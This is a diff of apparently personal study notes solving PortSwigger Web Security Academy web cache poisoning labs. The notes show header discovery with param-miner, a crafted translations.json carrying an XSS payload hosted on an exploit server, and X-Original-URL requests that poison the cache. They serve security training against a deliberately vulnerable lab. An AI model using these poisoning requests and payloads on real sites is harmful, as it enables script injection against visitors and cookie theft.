@@ -13,8 +13,7 @@ https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws
 To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
 
 hint:
-This lab supports the X-Forwarded-Host header. 
-
+> This lab supports the X-Forwarded-Host header.
 
 we see that **GET /resources/labheader/js/labHeader.js HTTP/1.1** points to:**/resources/images/tracker.gif?page=post**:
 
@@ -332,18 +331,20 @@ A user visits the home page roughly once a minute and their language is set to E
 
 To solve this lab, poison the cache with a response that executes alert(document.cookie) in the visitor's browser. 
 
-1. **investigate with param-miner:**
+# **scan with param-miner:**
 ```
 Identified parameter on 0a850006040a4dc5c0fb6750008500a2.web-security-academy.net:
 origin
-x-forwarded-host
+x-forwarded-host 
 x-original-url
 sec-websocket-version
 ```
-2.  **study home page:**
+#  **Test headers:**
 
-try diferent headers with *test* value in **GET / HTTP/1.1** observe that **x-forwarded-host** yields:
-```
+try diferent headers with *test* value in **GET / HTTP/1.1** observe that 
+
+**x-forwarded-host: test** yields:
+```htm
        <script>
             data = {
                 "host":"test",
@@ -357,22 +358,86 @@ try diferent headers with *test* value in **GET / HTTP/1.1** observe that **x-fo
        </script>
 ```
 
-this call for json implies code injection point. use the **x-forwarded-host** to point to xploit server and check exploit-server-log for a hit. once the link confirmed. we leave it for now.
+this call for json implies a code injection point. use the **x-forwarded-host** to point to the *xploit server* and check *exploit-server-log* for a request from the victims browser. this means our chached payload fired properly. 
 
-change to any language and back to english. study process. observe a cookie was generated with session and language setting. send **GET / HTTP/1.1** request (with the cookie) to repeater. 
+examin the Json call:
 
-
-2. **GET /resources/js/translations.js HTTP/1.1** 
-observe there are 2 almost identical **GET /resources/js/translations.js HTTP/1.1** requests. send to camparer and observe changes in headers value:
-```h
-Sec-Fetch-Dest: script  --> empty //(what is the intended use of the fetched data)
-Sec-Fetch-Mode: no-cors --> cors //allows Cross-Origin Resource Sharing   
-..
-Sec-Gpc: 1
+# **GET /resources/json/translations.json HTTP/1.1**
+request to fetch the Json object that consist of the dictionary used by translating process:
+```json
+{
+    "en": {
+        "name": "English"
+    },
+    "es": {
+        "name": "español",
+        "translations": {
+            "Return to list": "Volver a la lista",
+            "View details": "Ver detailes",
+            "Description:": "Descripción:"
+        }
+    },
+    ..
+    ..
+}    
 ```
-the responses are identical.
 
-lets manipulate the 2nd requets, with cors available. in response observe:
+use this format to craft a Json object in the exploit server. fill the fields as follow:
+
+assign file name and path on the exploit server according to the suffix **initTranslations** function adds automaticly:
+>initTranslations('//' + data.host + '/resources/json/translations.json')
+
+
+**File:** 
+/resources/json/translations.json
+```
+
+ change the Content-Type to a **application/json** and set CORS to accept from all sources **\***
+```
+
+**Head:**
+```
+HTTP/1.1 200 OK
+Content-Type: application/json; charset=utf-8
+Access-Control-Allow-Origin: *
+```
+
+at the same structure as the original Json craft the weaponized Json:
+
+**Body:**
+```json
+{
+    "en": {
+        "name": "English"
+    },
+    "es": {
+        "name": "espayol",
+        "translations": {
+            "Home": "<img src=x onerror=alert('document.cookie');>",
+            "View details": "fff",
+            "Description:": "Descripn:"
+        }
+    }
+}    
+```
+***sidenote**: though its faster to use the attack on "view details" key, it will also mean closing multiple POPs every time its fired...*
+
+send a **GET / HTTP/1.1** with a **x-forwarded-host: \[exploit-server-address]** 
+and see the response in a browser to confimrn the POP. press on the home link to refresh the page and confirmed another POP. confirm in Burp the request was a hit (cached response)
+
+at this stage our payload works for Spanish page only - it doesnt work on english pages. to understand the language process mechanism change to any language and back to english. observe a cookie was generated with session and language setting. follow the **initTranslations** function that appears in the homepage response and find it in **GET /resources/js/translations.js HTTP/1.1**
+<!-- 
+first observe there are 2 almost identical **GET /resources/js/translations.js HTTP/1.1** requests.they are different in the following headers (and the responses are identical):
+```h
+Sec-Fetch-Dest: script -> empty //header defines what is the intended use of the fetched data
+Sec-Fetch-Mode: no-cors -> cors //heade defines if Cross-Origin Resource Sharing is allowed  
+```
+we will examine the 2nd request (with CORS enabled). 
+-->
+
+the **initTranslations** function fetches the dictionary Json, parses the cookie for the the Language value and performs a translation on given situation. exminig the code reveals that translation process will fire in response**to any language key - as long as its not english**:
+> **lang.toLowerCase() !== 'en'**
+
 ```javascript
 
 function initTranslations(jsonUrl)
@@ -388,46 +453,9 @@ function initTranslations(jsonUrl)
         }); // the actual processing rules of translation. anything but english is being translated.
 }
 ```
-
-3.  **GET /resources/json/translations.json HTTP/1.1**
-the request for the translating object
-
-
-# plan your attack:
-1. by using **x-forwarded-host** in **GET / HTTP/1.1** point to explout server. 
-2. in exploit server create Json at the format of **GET /resources/json/translations.json HTTP/1.1** and include XSS attack in any language but english. 
-3. cache attack
-4. 
-
-
-1. **stage 1:** crafting Json object that pops in explot server (needed to try different HTML event)
-File:
-```
-/resources/json/translations.json
-```
-
-Head:
-```
-HTTP/1.1 200 OK
-Content-Type: application/json; charset=utf-8
-Access-Control-Allow-Origin: *
-```
-
-Body:
-```
-{
-    "en": {
-        "name": "English"
-    },
-    "es": {
-        "name": "attack",
-        "translations": {
-            "Home": "<img src=x onerror=alert('document.cookie');>",
-            "View details": "fff",
-            "Description:": "Descripn:"
-        }
-    }
-```
+from Lab description we knw Victim uses English page - so our spanish page cached response will not work on him. we need to make an english cached response to redirect to our cached Spanish page response.
+<!-- 
+**GET /?localized=1 HTTP/1.1**
 
 after further examine it seems the best injection point lies in the language change page:
 ```
@@ -438,10 +466,12 @@ x-forwarded-host: exploit-0a6b00b80383b6cbc0a5105601d60084.exploit-server.net
 
 
 ```
-this poisns the spanish page wiht our xss attack
+this poisns the spanish page with our xss attack -->
 
-2. **stage 2:** redirecting all english home request to spanish:
-we use the **X-Original-URL** which changes the path of the request to set the language to spanish.
+# **X-Original-URL**
+the param-miner also found the **X-Original-URL** which defines the *original* path (proxie wise) of a request. the header value defiends the *path* and request *Host header* is used for domain address.
+
+using **X-Original-URL** to set the language to spanish.
 
 ```
 GET / HTTP/1.1
@@ -450,13 +480,12 @@ X-Original-URL: /setlang/es
 
 
 ```
-we see in the response a problem the headers set-cookie cant be used to poison the cache: 
+we see in the response a problem: the headers **set-cookie** cant be used to poison the cache: 
 ```
 Set-Cookie: lang=es; Path=/; Secure
 Set-Cookie: session=0zHO1GJ3lEH7d8KNr7g1tNdiVrXR2bjB;
 ```
 we change the / into \ and hope the server will normalize: 
-
 ```
 GET / HTTP/1.1
 Host: 0a2500a30341b688c03a10850076005b.web-security-academy.net
@@ -477,14 +506,13 @@ Content-Length: 0
 ```
 there is no set-cookie header so its good to poison
 
-3. send both stages, one after the other and wait for the victim to load the poisoned pages
+# Attack:
+send both stages, one after the other and wait for the victim to load the poisoned pages
 
 # POP!
 
 
-
 # Exploiting cache implementation flaws  (7 labs)
 https://portswigger.net/web-security/web-cache-poisoning/exploiting-implementation-flaws
-
 
 
